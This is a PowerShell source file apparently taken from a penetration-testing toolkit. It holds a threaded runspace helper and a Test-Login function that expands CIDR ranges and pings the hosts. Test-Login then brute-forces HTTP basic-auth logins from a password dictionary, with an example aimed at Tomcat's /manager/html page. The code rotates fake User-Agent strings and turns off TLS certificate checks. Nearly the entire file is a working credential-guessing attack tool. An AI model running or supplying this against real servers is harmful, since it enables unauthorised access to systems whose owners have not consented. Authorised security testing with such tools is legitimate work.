function Invoke-ThreadedFunction
{
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String[]]$ComputerName,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,
        [Parameter(Position = 2)]
        [Hashtable]$ScriptParameters,
        [Int]$Threads = 20,
        [Int]$Timeout = 100
    )

    begin
    {

        if ($PSBoundParameters['Debug'])
        {
            $DebugPreference = 'Continue'
        }

        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!
        # create a pool of maxThread runspaces
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Counter = 0
    }

    process
    {

        ForEach ($Computer in $ComputerName)
        {

            # make sure we get a server name
            if ($Computer -ne '')
            {

                While ($($Pool.GetAvailableRunspaces()) -le 0)
                {
                    Start-Sleep -MilliSeconds $Timeout
                }

                # create a "powershell pipeline runner"
                $PS += [powershell]::create()
                $PS[$Counter].runspacepool = $Pool

                # add the script block + arguments
                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('ComputerName', $Computer)
                if ($ScriptParameters)
                {
                    ForEach ($Param in $ScriptParameters.GetEnumerator())
                    {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }

                # start job
                $Jobs += $PS[$Counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }

    end
    {

        Write-Verbose "Waiting for scanning threads to finish..."
        $WaitTimeout = Get-Date

        # set a 60 second timeout for the scanning threads
        while ($($Jobs | Where-Object { $_.IsCompleted -eq $False }).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60)
        {
            Start-Sleep -MilliSeconds $Timeout
        }

        # end async call
        for ($y = 0; $y -lt $Counter; $y++)
        {

            try
            {
                # complete async job
                $PS[$y].EndInvoke($Jobs[$y])

            }
            catch
            {
                Write-Warning "error: $_"
            }
            finally
            {
                $PS[$y].Dispose()
            }
        }

        $Pool.Dispose()
        Write-Verbose "All threads completed!"
    }
}

function Test-Login

{

<#
.SYNOPSIS

Test http basic authtication login.
.DESCRIPTION

A script to find potentially easily exploitable web servers on a target network.

.PARAMETER Rhosts

Targets in CIDR or comma separated format.

.PARAMETER Port

Specifies the port to connect to.

.PARAMETER Directory

Specifies the Directory to check "/admin".

.PARAMETER Username

Username

.PARAMETER Password
Password

.PARAMETER Dictionary
Password dictionary file

.PARAMETER UseSSL

Use an SSL connection.

.PARAMETER Threads

The maximum concurrent threads to execute..

.PARAMETER NoPing

Disable Ping Check


.EXAMPLE

Test-Login -Rhosts 127.0.0.1 -Port 8080 -Username manager -Password 'tomcat' -Directory '/manager/html' -Dictionary .\dictionary.txt

.NOTES
Credits to @harmj0y for the multithreading and @mattifestation for some of the web request help.

#>

[CmdletBinding()]

param (
    [Parameter(Mandatory = $True)]
    [String]$Rhosts,
    [Int]$Port,
    [String]$Directory,
    [String]$Dictionary,
    [String]$Username,
    [String]$Password,
    [Switch]$UseSSL,
    [ValidateRange(1, 100)]
    [Int]$Threads,
    [Switch]$NoPing
)

    begin
    {
        $hostList = New-Object System.Collections.ArrayList

        $iHosts = $Rhosts -split ","

        foreach ($iHost in $iHosts)
        {
            $iHost = $iHost.Replace(" ", "")

            if (!$iHost)
            {
                continue
            }

            if ($iHost.contains("/"))
            {
                $netPart = $iHost.split("/")[0]
                [uint32]$maskPart = $iHost.split("/")[1]

                $address = [System.Net.IPAddress]::Parse($netPart)
                if ($maskPart -ge $address.GetAddressBytes().Length * 8)
                {
                    throw "Bad host mask"
                }

                $numhosts = [System.math]::Pow(2, (($address.GetAddressBytes().Length * 8) - $maskPart))

                $startaddress = $address.GetAddressBytes()
                [array]::Reverse($startaddress)

                $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)
                [uint32]$startMask = ([System.math]::Pow(2, $maskPart) - 1) * ([System.Math]::Pow(2, (32 - $maskPart)))
                $startAddress = $startAddress -band $startMask
                #in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary
                $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]
                [array]::Reverse($startaddress)
                $address = [System.Net.IPAddress][byte[]]$startAddress

                $Null = $hostList.Add($address.IPAddressToString)

                for ($i = 0; $i -lt $numhosts - 1; $i++)
                {
                    $nextAddress = $address.GetAddressBytes()
                    [array]::Reverse($nextAddress)
                    $nextAddress = [System.BitConverter]::ToUInt32($nextAddress, 0)
                    $nextAddress++
                    $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]
                    [array]::Reverse($nextAddress)
                    $address = [System.Net.IPAddress][byte[]]$nextAddress
                    $Null = $hostList.Add($address.IPAddressToString)
                }
            }
            else
            {
                $Null = $hostList.Add($iHost)
            }
        }

        function Get-UserAgent {

          $UAString = @('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1)',
          'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
          'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
          'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
          'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
          'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
          'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1')

          $script:UserAgent = Get-Random -Input $UAString

        }

        function Test-Password {
                param (
                    [Parameter(Mandatory = $True)]
                    [String]$ComputerName,
                    [Int]$Port,
                    [String]$Directory,
                    [String]$Username,
                    [String]$Password,
                    [String]$SSL
                )
                $pair = "$($UserName):$($Password)"
                $encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
                $basicAuthValue = "Basic $encodedCreds"

                # Check Http status for each entry in the ditionary file
                foreach ($Target in $ComputerName)
                {
                    try {
                        Get-UserAgent
                        $WebTarget = "http$($SSL)://$($Target)$($PortNum)$($Directory)"
                        $URI = New-Object Uri($WebTarget)
                        $WebRequest = [System.Net.WebRequest]::Create($URI)
                        $WebRequest.PreAuthenticate=$true
                        $WebRequest.AllowAutoRedirect=$false
                        $WebRequest.TimeOut = 5000
                        $WebRequest.KeepAlive=$true
                        $WebRequest.Method = "GET"
                        $WebRequest.Headers.Add('UserAgent', $script:UserAgent)
                        $WebRequest.Headers.Add("Authorization", $basicAuthValue);
                        $WebRequest.Headers.Add("Keep-Alive: 300");
                        $WebResponse = $WebRequest.GetResponse()
                        $WebStatus = $WebResponse.StatusCode

                        If ($WebResponse.StatusCode -eq "OK")
                        {

                            Write-Output "[*] Possible successfull login with $($Username):$($Password) at $URI"
                        }

                    } catch {
                        $WebStatus = $Error[0].Exception.InnerException.Response.StatusCode
                        if ($WebStatus -eq $null) {
                            # Not every exception returns a StatusCode.
                            # If that is the case, return the Status.
                            $WebStatus = $Error[0].Exception.InnerException.Status
                        }
                    }
                }
            }

        $HostEnumBlock = {
            param($ComputerName, $UseSSL, $Port, $UserName, $PassWord, $Directory, $Dictionary)

            if ($UseSSL -and $Port -eq 0)
            {
                # Default to 443 if SSL is specified but no port is specified
                $Port = 443
            }
            elseif ($Port -eq 0)
            {
                # Default to port 80 if no port is specified
                $Port = 80
            }


            if ($UseSSL)
            {
                $SSL = 's'
                # Ignore invalid SSL certificates
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
            else
            {
                $SSL = ''
            }

            if (($Port -eq 80) -or ($Port -eq 443))
            {
                $PortNum = ''
            }
            else
            {
                $PortNum = ":$Port"
            }

            if ($Dictionary) {
                if (Test-Path -Path $Dictionary) {
                    foreach ($Item in Get-Content $Dictionary) {
                        $Password = $Item
                        Test-Password -ComputerName $ComputerName -Port $Port -Directory $Directory -UserName $Username -Password $Password -SSL $SSL
                    }
                }
                else {
                    Write-Warning "[!] Dictionary file '$Dictionary' not found!"
                }

            }
            else {
                Test-Password -ComputerName $ComputerName -Port $Port -Directory $Directory -UserName $Username -Password $Password -SSL $SSL
            }
        }
    }

    process {

        if(-not $NoPing -and ($hostList.count -ne 1)) {
            # ping all hosts in parallel
            $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
            $hostList = Invoke-ThreadedFunction -ComputerName $hostList -ScriptBlock $Ping -Threads 100
        }

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{

                'UseSSL' = $UseSSL
                'Port' = $Port
                'UserName' = $UserName
                'PassWord' = $PassWord
                'Directory' = $Directory
                'Dictionary' = $Dictionary
            }

            # kick off the threaded script block + arguments
            Invoke-ThreadedFunction -ComputerName $hostList -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            $ComputerName = $Rhosts
            Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $ComputerName, $UseSSL, $Port, $UserName, $PassWord, $Directory, $Dictionary
        }
    }
}
